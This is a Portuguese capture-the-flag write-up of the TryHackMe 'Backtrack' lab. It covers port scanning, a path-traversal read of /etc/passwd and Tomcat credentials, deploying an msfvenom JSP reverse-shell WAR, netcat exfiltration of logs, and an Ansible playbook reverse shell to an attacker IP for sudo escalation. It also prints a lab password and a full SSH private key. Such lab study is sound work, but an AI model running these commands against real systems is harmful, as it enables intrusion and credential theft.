# Passo a Passo das informações que foram coletadas durante o CTF

> [!Informações]
> - O IP da máquina foi adicionado ao `/etc/hosts` com a URL `http://backtrack.thm/`
> - Periodo: 29/04/2025 á 30/04/2025
> - Máquina do `TryHackMe` de Nível Médio
> - Sistema Operacional: Linux

## Início do reconhecimento da aplicação `backtrack`

Ao fazer o primeiro acesso na aplicação foi encontrado uma mensagem de erro na porta 80. 

![](attachment/8e9d589dc0b1aba8b25543d8ecfdf581.png)

### Rodando NMAP

Então foi iniciado uma varredura usando o NMAP
 >`nmap -sT -p- -T4 -v --min-rate 1000 backtrack.thm`


Foi revelado essas portas abertas
```
22/tcp   open  ssh
6800/tcp open  unknown
8080/tcp open  http-proxy
8888/tcp open  sun-answerbook
```


Então agora é feito uma varredura nos serviços e informações adicionais nessas portas:
> `nmap -sC -sV -p22,6800,8080,8888 -vv backtrack.thm`


```
PORT     STATE SERVICE         REASON  VERSION
22/tcp   open  ssh             syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 55:41:5a:65:e3:d8:c2:4f:59:a1:68:b6:79:8a:e3:fb (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDzPMYVGNn9fk2sUO4qG8t3GP/3ztCkoIRFTSFwnaHtRTiIe8s3ulwJkAyTZHSmedBOMihmyWyEmA44uxY4kUZEiba8R+c7aWHjTvD04VcKWPgVg1URPWMTHyxUcwKGnoh8n6VwM283+/4f2g2GSj2pVbacoV3xfDo8L4PshyfHK7dEd2qnQv9Yge3p5Aw/1Q7w1eaMZnaoicgzDgjhvqrRcS/DRcp3Lwoz6fGQW2/vFxW7d5aisTslKxRPslTy/Vrgprb7I+D9kdGEFqW/DXDfZLo+4O0woecE6+qSYPbIAjvIao25MTR8xHOFR0sCtyVfehEXYxvJ0fsqBG4yp/y15eDT3MSYevdvhHH1ZLejV66zILbPqUhzFBuMW1U6PKvSNPiQdzlnIRpD8ZQN7KJI8Y6zlHgoh8iu7+PgcUQNixYrX1GhMCYwNGHQlLOLriVRzhScZV3ObH1V8+g8I2sc3WZ54G2XUqZX+pN3ugjN1L5mo8mht1m7ZME+W9if37U=
|   256 79:8a:12:64:cc:5c:d2:b7:38:dd:4f:07:76:4f:92:e2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJfVuy7uiXVmzWVPtY/BYF+RZF36ZR8rh7wxeZi7yeOdWd06henZf8z5rYfalc0YHr6kE3clVa0jq+pF64w/lso=
|   256 ce:e2:28:01:5f:0f:6a:77:df:1e:0a:79:df:9a:54:47 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHMk87a1jTdUzEWZNm/XtZKIto5reBlJr75kFdCKXscp
6800/tcp open  http            syn-ack aria2 downloader JSON-RPC
|_http-title: Site doesn't have a title.
| http-methods: 
|_  Supported Methods: OPTIONS
8080/tcp open  http            syn-ack Apache Tomcat 8.5.93
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: Apache Tomcat/8.5.93
|_http-favicon: Apache Tomcat
8888/tcp open  sun-answerbook? syn-ack
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Content-Type: text/html
|     Date: Mon, 28 Apr 2025 20:02:10 GMT
|     Connection: close
|     <!doctype html>
|     <html>
|     <!-- {{{ head -->
|     <head>
|     <link rel="icon" href="../favicon.ico" />
|     <meta charset="utf-8">
|     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <meta name="theme-color" content="#0A8476">
|     <title ng-bind="$root.pageTitle">Aria2 WebUI</title>
|     <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Lato:400,700">
|     <link href="app.css" rel="stylesheet"><script type="text/javascript" src="vendor.js"></script><script type="text/javascript" src="app.js"></script></head>
|     <!-- }}} -->
|     <body ng-controller="MainCtrl" ng-cloak>
|     <!-- {{{ Icons -->
|     <svg aria-hidden="true" style="position: absolute; width: 0; height: 0; overflow: hidden;" version="1.1" xm
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/html
|     Date: Mon, 28 Apr 2025 20:02:11 GMT
|     Connection: close
|     <!doctype html>
|     <html>
|     <!-- {{{ head -->
|     <head>
|     <link rel="icon" href="../favicon.ico" />
|     <meta charset="utf-8">
|     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <meta name="theme-color" content="#0A8476">
|     <title ng-bind="$root.pageTitle">Aria2 WebUI</title>
|     <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Lato:400,700">
|     <link href="app.css" rel="stylesheet"><script type="text/javascript" src="vendor.js"></script><script type="text/javascript" src="app.js"></script></head>
|     <!-- }}} -->
|     <body ng-controller="MainCtrl" ng-cloak>
|     <!-- {{{ Icons -->
|_    <svg aria-hidden="true" style="position: absolute; width: 0; height: 0; overflow: hidden;" version="1.1" xm
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8888-TCP:V=7.94SVN%I=7%D=4/28%Time=680FDEC3%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,31E2,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/html\
SF:r\nDate:\x20Mon,\x2028\x20Apr\x202025\x2020:02:10\x20GMT\r\nConnection:
SF:\x20close\r\n\r\n<!doctype\x20html>\n<html>\n\n<!--\x20{{{\x20head\x20-
SF:->\n<head>\n\x20\x20<link\x20rel=\"icon\"\x20href=\"\.\./favicon\.ico\"
SF:\x20/>\n\n\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20<meta\x20http-eq
SF:uiv=\"X-UA-Compatible\"\x20content=\"IE=edge,chrome=1\">\n\x20\x20<meta
SF:\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-scale
SF:=1\.0\">\n\x20\x20<meta\x20name=\"theme-color\"\x20content=\"#0A8476\">
SF:\n\n\x20\x20<title\x20ng-bind=\"\$root\.pageTitle\">Aria2\x20WebUI</tit
SF:le>\n\n\x20\x20<link\x20rel=\"stylesheet\"\x20type=\"text/css\"\x20href
SF:=\"https://fonts\.googleapis\.com/css\?family=Lato:400,700\">\n\n<link\
SF:x20href=\"app\.css\"\x20rel=\"stylesheet\"><script\x20type=\"text/javas
SF:cript\"\x20src=\"vendor\.js\"></script><script\x20type=\"text/javascrip
SF:t\"\x20src=\"app\.js\"></script></head>\n<!--\x20}}}\x20-->\n\n<body\x2
SF:0ng-controller=\"MainCtrl\"\x20ng-cloak>\n\n<!--\x20{{{\x20Icons\x20-->
SF:\n<svg\x20aria-hidden=\"true\"\x20style=\"position:\x20absolute;\x20wid
SF:th:\x200;\x20height:\x200;\x20overflow:\x20hidden;\"\x20version=\"1\.1\
SF:"\x20xm")%r(HTTPOptions,31E2,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x
SF:20text/html\r\nDate:\x20Mon,\x2028\x20Apr\x202025\x2020:02:11\x20GMT\r\
SF:nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<html>\n\n<!--\x20{{{\
SF:x20head\x20-->\n<head>\n\x20\x20<link\x20rel=\"icon\"\x20href=\"\.\./fa
SF:vicon\.ico\"\x20/>\n\n\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20<met
SF:a\x20http-equiv=\"X-UA-Compatible\"\x20content=\"IE=edge,chrome=1\">\n\
SF:x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20i
SF:nitial-scale=1\.0\">\n\x20\x20<meta\x20name=\"theme-color\"\x20content=
SF:\"#0A8476\">\n\n\x20\x20<title\x20ng-bind=\"\$root\.pageTitle\">Aria2\x
SF:20WebUI</title>\n\n\x20\x20<link\x20rel=\"stylesheet\"\x20type=\"text/c
SF:ss\"\x20href=\"https://fonts\.googleapis\.com/css\?family=Lato:400,700\
SF:">\n\n<link\x20href=\"app\.css\"\x20rel=\"stylesheet\"><script\x20type=
SF:\"text/javascript\"\x20src=\"vendor\.js\"></script><script\x20type=\"te
SF:xt/javascript\"\x20src=\"app\.js\"></script></head>\n<!--\x20}}}\x20-->
SF:\n\n<body\x20ng-controller=\"MainCtrl\"\x20ng-cloak>\n\n<!--\x20{{{\x20
SF:Icons\x20-->\n<svg\x20aria-hidden=\"true\"\x20style=\"position:\x20abso
SF:lute;\x20width:\x200;\x20height:\x200;\x20overflow:\x20hidden;\"\x20ver
SF:sion=\"1\.1\"\x20xm");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### Explorando o `TOMCAT/8.5.93`


![](attachment/a7c2476f2ac51a17f428408da8538b69.png)

Foi feito uma análise de diretórios expostos e procurando informações relevantes para uma enumeração, mas não foi encontrado nada.

### Explorando o serviço da porta 8888 (`Aria2 WebUI`)

![](attachment/b971e2c560c02f90ab5ea254b2e4398f.png)

A aplicação foi analisada a fim de encontrar algumas falhas. A aplicação deu permissão para upar um arquivo e foi upado uma `shell.php`, mas não foi encontrado a pasta de uploads, mas ao pesquisar na internet foi encontrado um exploit

Link encontrado do Exploit: https://gist.github.com/JafarAkhondali/528fe6c548b78f454911fb866b23f66e

PoC: `curl --path-as-is http://backtrack.thm:8888/../../../../../../../../../../../../../../../../../../../../etc/passwd`

> [!Dica]
> `--path-as-is` instrui o `curl` a **não normalizar** a URL antes de enviar a requisição.

![](attachment/1a7c661ea12c258bcaef753f1732927e.png)

Procurando por arquivos interessantes, superficialmente, foi analisado os 3 diretórios respectivamente

`/etc/passwd/`
`/proc/self/environ`
`/etc/self/cmdline`

```
2 Usuários: orville & wilbur

Variavéis do Ambiente: LANG=C.UTF-8 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin HOME=/opt/tomcat LOGNAME=tomcat USER=tomcat INVOCATION_ID=7bedb2602f6e4d6aa37a9329c4c35cc6 JOURNAL_STREAM=9:20905 

Informação que está no /etc/self/cmdline: /usr/bin/node /opt/aria2/node-server.js
```

Então foi analisado a URL que está rodando a aplicação (node-server.js)

`curl --path-as-is http://backtrack.thm:8888/../../../../../../../../../../../../../../../../../../../../usr/bin/node/opt/aria2/node-server.js`

Mas foi retornado: "404 Not Found"

Então com a **FALHA DE LFI** foi pensado em no primeiro momento deixar a aplicação da porta 8888 em stand-by e começar a procurar por arquivos de configuração que possa permitir a exploração do TOMCAT

### Retomando a exploração do `TOMCAT`

#### Lendo o arquivo server.xml

`curl --path-as-is http://backtrack.thm:8888/../../../../../../../../../../../../../../../../../../../../opt/tomcat/conf/server.xml`

```
<?xml version="1.0" encoding="UTF-8"?>
<!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<!-- Note:  A "Server" is not itself a "Container", so you may not
     define subcomponents such as "Valves" at this level.
     Documentation at /docs/config/server.html
 -->
<Server port="8005" shutdown="SHUTDOWN">
  <Listener className="org.apache.catalina.startup.VersionLoggerListener" />
  <!-- Security listener. Documentation at /docs/config/listeners.html
  <Listener className="org.apache.catalina.security.SecurityListener" />
  -->
  <!-- APR library loader. Documentation at /docs/apr.html -->
  <Listener className="org.apache.catalina.core.AprLifecycleListener" SSLEngine="on" />
  <!-- Prevent memory leaks due to use of particular java/javax APIs-->
  <Listener className="org.apache.catalina.core.JreMemoryLeakPreventionListener" />
  <Listener className="org.apache.catalina.mbeans.GlobalResourcesLifecycleListener" />
  <Listener className="org.apache.catalina.core.ThreadLocalLeakPreventionListener" />

  <!-- Global JNDI resources
       Documentation at /docs/jndi-resources-howto.html
  -->
  <GlobalNamingResources>
    <!-- Editable user database that can also be used by
         UserDatabaseRealm to authenticate users
    -->
    <Resource name="UserDatabase" auth="Container"
              type="org.apache.catalina.UserDatabase"
              description="User database that can be updated and saved"
              factory="org.apache.catalina.users.MemoryUserDatabaseFactory"
              pathname="conf/tomcat-users.xml" />
  </GlobalNamingResources>

  <!-- A "Service" is a collection of one or more "Connectors" that share
       a single "Container" Note:  A "Service" is not itself a "Container",
       so you may not define subcomponents such as "Valves" at this level.
       Documentation at /docs/config/service.html
   -->
  <Service name="Catalina">

    <!--The connectors can use a shared executor, you can define one or more named thread pools-->
    <!--
    <Executor name="tomcatThreadPool" namePrefix="catalina-exec-"
        maxThreads="150" minSpareThreads="4"/>
    -->


    <!-- A "Connector" represents an endpoint by which requests are received
         and responses are returned. Documentation at :
         Java HTTP Connector: /docs/config/http.html
         Java AJP  Connector: /docs/config/ajp.html
         APR (HTTP/AJP) Connector: /docs/apr.html
         Define a non-SSL/TLS HTTP/1.1 Connector on port 8080
    -->
    <Connector port="8080" protocol="HTTP/1.1"
               connectionTimeout="20000"
               redirectPort="8443"
               maxParameterCount="1000"
               />
    <!-- A "Connector" using the shared thread pool-->
    <!--
    <Connector executor="tomcatThreadPool"
               port="8080" protocol="HTTP/1.1"
               connectionTimeout="20000"
               redirectPort="8443"
               maxParameterCount="1000"
               />
    -->
    <!-- Define an SSL/TLS HTTP/1.1 Connector on port 8443
         This connector uses the NIO implementation. The default
         SSLImplementation will depend on the presence of the APR/native
         library and the useOpenSSL attribute of the AprLifecycleListener.
         Either JSSE or OpenSSL style configuration may be used regardless of
         the SSLImplementation selected. JSSE style configuration is used below.
    -->
    <!--
    <Connector port="8443" protocol="org.apache.coyote.http11.Http11NioProtocol"
               maxThreads="150" SSLEnabled="true"
               maxParameterCount="1000"
               >
        <SSLHostConfig>
            <Certificate certificateKeystoreFile="conf/localhost-rsa.jks"
                         type="RSA" />
        </SSLHostConfig>
    </Connector>
    -->
    <!-- Define an SSL/TLS HTTP/1.1 Connector on port 8443 with HTTP/2
         This connector uses the APR/native implementation which always uses
         OpenSSL for TLS.
         Either JSSE or OpenSSL style configuration may be used. OpenSSL style
         configuration is used below.
    -->
    <!--
    <Connector port="8443" protocol="org.apache.coyote.http11.Http11AprProtocol"
               maxThreads="150" SSLEnabled="true"
               maxParameterCount="1000"
               >
        <UpgradeProtocol className="org.apache.coyote.http2.Http2Protocol" />
        <SSLHostConfig>
            <Certificate certificateKeyFile="conf/localhost-rsa-key.pem"
                         certificateFile="conf/localhost-rsa-cert.pem"
                         certificateChainFile="conf/localhost-rsa-chain.pem"
                         type="RSA" />
        </SSLHostConfig>
    </Connector>
    -->

    <!-- Define an AJP 1.3 Connector on port 8009 -->
    <!--
    <Connector protocol="AJP/1.3"
               address="::1"
               port="8009"
               redirectPort="8443"
               maxParameterCount="1000"
               />
    -->

    <!-- An Engine represents the entry point (within Catalina) that processes
         every request.  The Engine implementation for Tomcat stand alone
         analyzes the HTTP headers included with the request, and passes them
         on to the appropriate Host (virtual host).
         Documentation at /docs/config/engine.html -->

    <!-- You should set jvmRoute to support load-balancing via AJP ie :
    <Engine name="Catalina" defaultHost="localhost" jvmRoute="jvm1">
    -->
    <Engine name="Catalina" defaultHost="localhost">

      <!--For clustering, please take a look at documentation at:
          /docs/cluster-howto.html  (simple how to)
          /docs/config/cluster.html (reference documentation) -->
      <!--
      <Cluster className="org.apache.catalina.ha.tcp.SimpleTcpCluster"/>
      -->

      <!-- Use the LockOutRealm to prevent attempts to guess user passwords
           via a brute-force attack -->
      <Realm className="org.apache.catalina.realm.LockOutRealm">
        <!-- This Realm uses the UserDatabase configured in the global JNDI
             resources under the key "UserDatabase".  Any edits
             that are performed against this UserDatabase are immediately
             available for use by the Realm.  -->
        <Realm className="org.apache.catalina.realm.UserDatabaseRealm"
               resourceName="UserDatabase"/>
      </Realm>

      <Host name="localhost"  appBase="webapps"
            unpackWARs="true" autoDeploy="true">

        <!-- SingleSignOn valve, share authentication between web applications
             Documentation at: /docs/config/valve.html -->
        <!--
        <Valve className="org.apache.catalina.authenticator.SingleSignOn" />
        -->

        <!-- Access log processes all example.
             Documentation at: /docs/config/valve.html
             Note: The pattern used is equivalent to using pattern="common" -->
        <Valve className="org.apache.catalina.valves.AccessLogValve" directory="logs"
               prefix="localhost_access_log" suffix=".txt"
               pattern="%h %l %u %t &quot;%r&quot; %s %b" />

      </Host>
    </Engine>
  </Service>
</Server>
```

#### O que pode ser analisado do `server.xml`

| **ITEM**                                        | ANÁLISE                                                                        | IMPACTO DE SEGURANÇA                                                                                          |
| ----------------------------------------------- | ------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------- |
| Shutdown Port: 8005                             | Porta especial que permite enviar o comando `SHUTDOWN` para encerrar o Tomcat. | Se exposta na rede, permite a **parada remota do serviço**!                                                   |
| HTTP Connector: 8080                            | Porta principal para requisições HTTP sem SSL.                                 | **Sem HTTPS** → tráfego pode ser interceptado/sniffado (credenciais, sessões).                                |
| RedirectPort: 8443                              | Se precisar de SSL, redirecionaria para a porta 8443 (mas está comentado).     | **SSL não configurado ativo** → sem segurança de dados em trânsito.                                           |
| AJP Connector: 8009 (comentado)                 | Conector AJP usado para integrar com servidores web como Apache HTTPD.         | Comentado aqui (bom), mas se estivesse ativo seria altamente perigoso (Ghostcat CVE-2020-1938).               |
| GlobalNamingResources → tomcat-users.xml        | Define que a autenticação será feita pelo arquivo `conf/tomcat-users.xml`.     | Se o `tomcat-users.xml` for acessível ou mal configurado, pode vazar **usuários e senhas de administração**.  |
| Host - appBase: webapps                         | Diretório onde as aplicações `.war` são implantadas automaticamente.           | **AutoDeploy = true** + **unpackWARs = true** → se puder fazer upload, pode implantar shells facilmente.      |
| ogs configurados: logs/localhost_access_log.txt | Logs de acesso HTTP estão ativados.                                            | Bom para análise forense. Mas cuidado: logs podem expor tokens, cookies, paths sensíveis se mal configurados. |
| Security Listener (comentado)                   | Proteções extras de segurança para o Tomcat não estão ativas.                  |                                                                                                               |
#### Lendo arquivo de configuração do tomcat users:

`curl --path-as-is http://backtrack.thm:8888/../../../../../../../../../../../../../../../../../../../../opt/tomcat/conf/tomcat-users.xml`

![](attachment/5f6dcea393672266f615c9d145d913b4.png)

> [!OBTENDO AS PRIMEIRAS CREDENCIAIS]
> user username="tomcat" password="OPx52k53D8OkTZpx4fr" roles="manager-script"

Foi feito uma tentativa de login e... **SEM SUCESSO**

![](attachment/b3b88169feade33abbb4db523754d740.png)


## Obtendo uma `Shell reversa`

Como não teve êxito tentando autenticar via GUI (Graphics User Interface) foi descoberto algumas informações interessantes como:
- O Servidor `Tomcat` usa esse arquivo para definir quem pode fazer login e quais permissões eles têm
- o usuário `tomcat` tem o papel `manager-script`, que é perfeito para automação. O que de certo modo, torna mais fácil fazer requisição porque não é necessário o `GUI`, apenas requisições HTTP para controlar o `TOMCAT`
- `manager-script` permite fazer upload de aplicações `.war` via endpoint de texto `/manager/text/`

> [!O que é .war]
> É um **arquivo compactado** (como um `.zip`) que contém **toda a estrutura de uma aplicação web** escrita para rodar em **servidores Java** (como o Apache Tomcat).

### Criação da `Shell .war`
Foi usado o `msfvenom` um módulo do `metasploit` para fazer a criação da shell

`msfvenom -p java/jsp_shell_reverse_tcp LHOST=SEU_IP LPORT=SEU_PORTA -f war -o your_shell.war`

`-p java/jsp_shell_reverse_tcp`: É uma `payload` especifica para a criação de uma shell reversa escrita em `JSP` para servidores `Tomcat/Java`
### Upload da `payload .war via cURL`

#### Envio e entendimento da `payload`
`curl -u tomcat:OPx52k53D8OkTZpx4fr -T your_shell.war "http://backtrack.thm:8080/manager/text/deploy?path=/shell&update=true"`

| PARTE                                               | O QUE FAZ                                                                                      |
| --------------------------------------------------- | ---------------------------------------------------------------------------------------------- |
| `curl`                                              | Usar o terminal para fazer requisições HTTP.                                                   |
| `-u tomcat:OPx52k53D8OkTZpx4fr`                     | Autenticar com usuário e senha via Basic Auth HTTP.                                            |
| `-T your_shell.war`                                 | Upload do arquivo `.war` como corpo da requisição (Transfer).                                  |
| URL `http://backtrack.thm:8080/manager/text/deploy` | Endpoint `/manager/text/deploy` recebe comandos para fazer **deploy de aplicações** no Tomcat. |
| `?path=/shell`                                      | Define o caminho onde o Tomcat irá "montar" a aplicação.                                       |
| `&update=true`                                      | Se a aplicação já existir, substituir.                                                         |
#### O que acontece internamente no Tomcat

- O Tomcat **recebe** o `.war` via HTTP.
- Ele **extrai** o conteúdo automaticamente porque:
    - `unpackWARs="true"` no `server.xml`.
    - `autoDeploy="true"` no `server.xml`.
- Isso significa:
    - Ele descompacta o `.war`.
    - Cria um diretório `/opt/tomcat/webapps/shell/`.
    - Disponibiliza o `.jsp` ou arquivos contidos no navegador automaticamente.
**Sem você precisar reiniciar o servidor!**

#### Ativando a Shell

Dado todos esses passos, o atacante vai precisar apenas configurar o `listener` com o `nc`
`nc -lvnp 4444`

E por fim, para receber a conexão basta acessar via URL onde está localizada a `shell`
`http://backtrack.thm:8080/shell/`

![](attachment/f0ac660a620c9a0302cfad3459a26f5d.png)

## Pós-Exploração

Primeira coisa que sempre é executada antes de partirem para a exploração em si é rodar um modulo do Python
`python3 -c 'import pty; pty.spawn("/bin/bash")'`

### Analisando diretórios
Bem, a primeira coisa foi dar umas vasculhadas bem rápidas em alguns diretórios como
- `/home` -> Nada de mais
- `/home/orville` -> Usuário enumerada anteriormente, mas sem acesso o diretório
- `/home/wilbur` -> Usuário enumerada anteriormente, mas sem acesso o diretório
- `/var/www/html` Sem acesso o diretório
- `/opt` -> Devido a pasta de configuração do tomcat

![](attachment/4bd5388dbae415aba42f34240f36fa33.png)

#### Analisando o diretório `/opt/tomcat`
![](attachment/ccc560d1a6551c8953f5deaffbabe476.png)

> [!Foi encontrado a primeira flag]
> THM{823e4e40ead9683b06a8194eab01cee8}

##### Analisando o diretório `/opt/tomcat/logs`

![](attachment/3268fe3e2e00a79bda3c9a1ec0d75422.png)
Com todos esses logs foi pensado uma exfiltração e a maneira mais fácil foi zipando todos os arquivos e exfiltrando para a máquina do atacante através do `nc`

Primeiro foi verificando se a máquina continha o binário `zip`
![](attachment/82e9f3a6f8f1dc2008beb804853a446e.png)

==Caso não existisse, seria procurado uma outra alternativa como o binário `tar`==

Foi executado o comando `zip -r logs.zip .`

![](attachment/4f04ba357b6b4bac10a9a0be9cf80945.png)

Máquina do Atacante (Máquina que **RECEBERÁ** o arquivo): `nc -lvnp 9898 > logs.zip`
**Máquina Vítima** (Máquina que **ENVIARÁ** o arquivo): `nc SEU_IP_ATACANTE 4444 < logs.zip`

Os arquivos foi analisados e não foi encontrado nada de útil


#### Analisando o diretório `/opt/aria2/`

![](attachment/756553fdf0b3a05837df77a854a4cd82.png)
Fazendo uma análise nos sub-diretórios e nos arquivos não foram encontrados arquivos interessantes

#### Analisando o diretório `/opt/test_playbooks`

![](attachment/4200ad3ba83753afe4ed0d2dc1e0adad.png)

Esses dois arquivos também não mostraram grandes informações relevantes, mas o curioso é que quando foi executado o `sudo -l
`
![](attachment/f65ef41eb5b4cf1bc47bf0b8f04626aa.png)


### SUDO Misconfiguration
Foi tentado de várias formas que o usuário `wilbur` executasse algum arquivo que elevasse os privilégios de `tomcat` -> `wilbur`, mas sem sucesso. 

Mas, sabermos, que esse é a linha de escalação `(wilbur) NOPASSWD: /usr/bin/ansible-playbook /opt/test_playbooks/*.yml`

Foi feito bastante pesquisa para encontrar algo semelhante a essa "vulnerabilidade" e foi encontrado um artigo com um caso semelhante

![](attachment/430d14784d5851f0afc447a35c002c2f.png)

Então foi seguindo essa linha de raciocínio que foi criado o arquivo `escalate.yml`

```
---
- name: Reverse shell como wilbur
  hosts: localhost
  tasks:
    - name: Enviar shell para atacante
      shell: rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.13.72.32 9001 > /tmp/f
```

E logo após isso, foi baixado (para máquina da vítima o escalate.yml) -> Deu todas as permissões (para todos os usuários poder executarem) -> e executamos passando o usuário `wilbur`

![](attachment/3ec0c1aab01140a98dd35fcbdfc0aa95.png)

![](attachment/d28909e6afe4db2c1e8aaa1b505a6e16.png)

## Escalação de Privilégios

### Usuário `Wilbur`
Nesse estágio do CTF foi conseguido passar do usuário `tomcat` -> `wilbur`

#### Criando Persistência

Foi buscado alguns meios para persistir a conexão um deles foi passar o arquivo malicioso (que fez a shell reversa) para a pasta `/opt/test_playbooks` com a permissão que todos pudesse executar

E também foi criado uma chave `ssh` para o usuário para facilitar o meio de persistência
```
wilbur@Backtrack:~/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
